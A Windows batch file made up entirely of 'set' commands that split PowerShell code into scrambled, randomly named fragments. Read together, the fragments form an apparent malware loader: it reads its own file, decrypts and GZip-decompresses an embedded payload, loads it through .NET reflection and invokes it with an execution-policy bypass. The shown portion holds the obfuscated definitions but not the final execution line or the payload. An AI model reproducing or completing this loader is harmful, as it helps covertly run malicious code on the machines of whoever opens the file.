@echo off
set "YmRJasZwVQ=[Sys"
set "ZryejuVxyD=CFxo"
set "HohuOIFiou=);$Z"
set "wMEWGZkGYU=ptog"
set "yuiSteDYgl=pStr"
set "nRoLgFQfoW=Secu"
set "GsADGLVOOr=.Ass"
set "SFhmxQtUUH=)($U"
set "WPgNvzVHLo=();$"
set "JqjHNQxeoz=ct S"
set "XdLfqfrWTS=nage"
set "NyUvpvuBXd=yste"
set "ZHSeiAyACq=ment"
set "kziLpDOhWU=and "
set "aOszzFyZnE=[-1."
set "kdPHJaibSK=WDH."
set "HYxoLnXDfE=ddin"
set "toxSZZFdwR=ptog"
set "scLYZhfqby= [Sy"
set "mhTSDpyjmI=cD ="
set "CCtEEMetZI='gni"
set "YQAKHIZSpQ=lit("
set "VimVfSSwPx=$ZyN"
set "lzfsgxgXPb=n ''"
set "HrGGatfweK=D = "
set "DXlHeLRspO=.Len"
set "ADDGjAaQae=-joi"
set "XMJYTuOJLU=ugmc"
set "HFIJcmyWft=Syst"
set "XubTuPHEMZ=$ugm"
set "SMIqYAemox=[Sys"
set "DPfglNgQLh=ewLi"
set "keZVJnMUJC=J) {"
set "PVHejPHWiU=dj0C"
set "xTmYNaRebE=flec"
set "WTUbYXaLYA=.Mem"
set "dmbQaRkMhY=m.Re"
set "YiqhrZferM=Fina"
set "rQcntmwvzZ=fore"
set "htsczaYojP=ose("
set "bIqrmzEcOp='')("
set "dvoALsJNjN=-joi"
set "KLmqxcNvbx=DH.T"
set "jrkJsesIsc=('da"
set "ruOnjYdfbe=]::N"
set "CrknmZTDIs=.-16"
set "jzsSkPnSyJ=PKCS"
set "zzruXJsadL=em.I"
set "LZdcaBTvWc=Obje"
set "DyScKFTCuH=S = "
set "sgmOAtgDic=($qO"
set "nmFzDTLNuK=m(, "
set "oFuPphwrQC=$mhW"
set "vtKZZmUEKq=pose"
set "llHUkMKAoq=morF"
set "bAbYKLhmOS=YxVw"
set "bCoRSaUyHK=rSm "
set "tZYQqdRlvp=tsWi"
set "twaTIMsopR=se()"
set "giLGQsxUeS=th('"
set "OAJAyJKiJP=ert]"
set "LursBkTJUj=bstr"
set "KdmCZHCrLw=);$Z"
set "fJPLZPxOIG=ypto"
set "IYRkLlDkyO=m.IO"
set "BQVjYTSUjE=ect "
set "bFpCWayMQO=ateD"
set "SFJIGVVLgi=ing("
set "lmHKtTmVIo=embl"
set "vVNgSDyNyO=ew-O"
set "SReFqArRPO=eam("
set "AdniUUuJRR=).Sp"
set "LTEWFsBydA=form"
set "YtIWvlIhdA=, $u"
set "EmrJZDEmhl=k; }"
set "TCdHaZKiaz=rtS4"
set "WTWNLRSDMS=);$m"
set "VpmPvmkMFP=oint"
set "NGtvWXPUmU=e = "
set "cuWhTpKXln=D, 0"
set "VazvUryYoP=$ugm"
set "kMaDuczAmp=Stre"
set "bNqIgHmZxZ=m.IO"
set "PKqWooSflN= [Sy"
set "LImYBuSuMa=urit"
set "NVCMTJepPz=F'[-"
set "gjeyhhFueo=gth)"
set "tyGtQhQgKE=y.Pa"
set "SgNidJXLyg=le  "
set "RQbIdOtpMG=em.C"
set "IJppbYdQBF=tS46"
set "MHNvMIGtmN=]::("
set "GJTEHrUvMS=ZQKB"
set "dGwoOgCOCO=.Cre"
set "ColjniefZt=ke($"
set "kuMnDzHHTD=Bj.D"
set "DdoBncqfCu= = $"
set "ZDCuUiOecG=yNoS"
set "FAyWPzerMp=V = "
set "dxmEjvXixD=Star"
set "lhWQzIAGza=]::("
set "xoyvCfDnoy=hy.A"
set "dGqYnJgIHI=('Tg"
set "RQaZxVHecR=e]::"
set "YXFPivZOJQ== [S"
set "qsxSpaiAOK=BC;$"
set "DqAtXqauHx=y]::"
set "hALKsGDEvd=SGHk"
set "ppgYfGiiZV=();$"
set "DlAvNtqKWh= '')"
set "srVIEVIZHt=Obje"
set "duciRTnejw=s75K"
set "BrFJwSjgDx=Comp"
set "xXwXoEbuhP=$yVW"
set "qYkkYqmeew=('%~f0'"
set "zdCQqfhyNx=ress"
set "OKhjWGzJMW=raph"
set "fVMJgGxfYz==');"
set "GlJJYzYrAT=iron"
set "Qqzfqveixv=eMVs"
set "CoklUYsoml=$mhW"
set "QiiaPMiFdu=gmcD"
set "fwiHLsuiPg=lBlo"
set "LrvOOSRjfc=D = "
set "dxUMvxbvep=6] -"
set "CNXbacsiwu=]::C"
set "bVPrXofcgY=tem."
set "imtElVpWDe=)))"
set "pbhBelvOkK=);$s"
set "lpeUfzqDQG=g = "
set "aUuTXkHiUh=ion."
set "kwUtlImDWO=zHhH"
set "oCCkyRAqFf=join"
set "NaQArRjdfB=ss -"
set "RNYbghLqHd=[IO."
set "GBpujFNSEb=Syst"
set "zwlXjSVXvz=Invo"
set "wTpwpkBMSv=ach "
set "UOGzEtBcpq=tem."
set "haucgTRwDt='[-1"
set "eHgvBJuVJA=WDH "
set "YFkbpWalOJ=$SGH"
set "LflePmLvdy=LuO."
set "kKDUeWEOrS=ose("
set "zNrapDdcBD=tem."
set "ZnQPRhIBQA=;$yV"
set "HpcxAccDSs=j = "
set "XwTjZeBWxV=;$Sf"
set "PXkxYpIlwK=stem"
set "qKqMLQrVgH=in $"
set "BscqZNnWPb= [st"
set "YPWYETiuxv=.GZi"
set "tzDaZrrTIL=ay()"
set "NTqmxMCCaG=oryS"
set "fIBwnSnFAK= '')"
set "NehrbpBBpF=sAlI"
set "bJBZsENYiP=$nsB"
set "uRbTVwsQjW=l5E7"
set "vRkFYxsTen=gMod"
set "NIdgdPjDdC=oin "
set "eWcCmKbHGI=nsBr"
set "DgLFrSjyHm=::('"
set "mbCkxwpxPB=;$ss"
set "aPipIuHMfV=FL ="
set "JTpLUosaGJ=zuZI"
set "RvsnelQNEC=RmAx"
set "CttwzlJSjg=y.Ci"
set "LSJWnJqnrc=PxEW"
set "SqqvDPQiIT=rity"
set "jzvvFVmSxV= = ["
set "UosGmiInjy=bypa"
set "EjjOWtPTEY=Mode"
set "BCYyzHGiAt=PTtG"
set "lbgsyxVlTR=qOLu"
set "gtTZRzDBEI=ress"
set "COmXKQktiT=d;$Z"
set "XceEGxaMdv=mPvB"
set "yhvQJVAfgE=; };"
set "JcAawhKmVE=grap"
set "nkbcqDWXBz=)($u"
set "lJDKhwPocA=Comp"
set "EQVWWdTfza=$ZQK"
set "szfuSElBNl=('%*'"
set "XxmoQExlWP=raph"
set "NDXummMqyV=ddin"
set "PdhmunYdYZ=O.Me"
set "emPlapvKdi=;$SG"
set "oBUvLldAYf=SfrS"
set "qeDohiznUY=rans"
set "KhwmDduwOg=);$Z"
set "AeERRAzVDM=.Dis"
set "vjkSKoEHjk=..-1"
set "OIjeyvBYcw===')"
set "UzodkDlVpx=1] -"
set "xCnbqtyMrQ=:('g"
set "fNzidRgpLf=ck($"
